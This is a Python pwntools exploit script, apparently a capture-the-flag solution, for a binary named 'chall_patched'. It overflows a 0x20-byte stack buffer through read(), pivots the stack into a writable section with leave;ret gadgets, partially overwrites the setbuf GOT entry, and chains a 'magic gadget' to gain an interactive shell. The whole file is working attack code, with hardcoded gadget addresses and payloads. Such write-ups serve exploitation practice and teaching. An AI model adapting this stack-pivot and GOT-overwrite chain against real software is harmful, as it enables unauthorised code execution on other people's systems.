#!/usr/bin/env python3
from hakai import *
from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* vuln+36
        
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
'''
   0x00000000004011a9 <+12>:    lea    rax,[rbp-0x20]
   0x00000000004011ad <+16>:    mov    edx,0x30
   0x00000000004011b2 <+21>:    mov    rsi,rax
   0x00000000004011b5 <+24>:    mov    edi,0x0
   0x00000000004011ba <+29>:    call   0x401060 <read@plt>
'''
magic_gadget = 0x40113c
leave_ret = 0x4011c0
ret = 0x40101a
wr_section = 0x404e00
pop_rbp_ret = 0x40113d
ret = 0x40101a
read_main = 0x4011a9
offset = 0xfffd7512
payload = flat(
    b'A'*0x20,
    exe.got.setbuf + 0x20 + 0x20,     #rbp
    read_main                         #rip
)
input()
s(p, payload)


payload = flat(
    wr_section,                #rbp 3
    read_main,                 #rip 3
    b'A'*0x10,                 
    exe.got.setbuf + 0x20,     #rbp 2                
    read_main                  #rip 2
) 
input()
s(p, payload)
input()
s(p, p16(0x113e))
input()

payload = flat(
    exe.plt.setbuf,                   #wr_section + 0x48
    offset,                   #wr_section + 0x50
    exe.got.read + 0x3d,                   #wr_section + 0x58
    magic_gadget,                   #wr_section + 0x60
    0x404e20+0x20+0x20,     #rbp
    read_main              #rip
)
s(p, payload)
input()

payload = flat(
    exe.plt.read,
    leave_ret,
    0xdeadbeef,
    0xcafebabe,
    0x404e20-8,
    leave_ret
)
s(p, payload)

p.interactive()
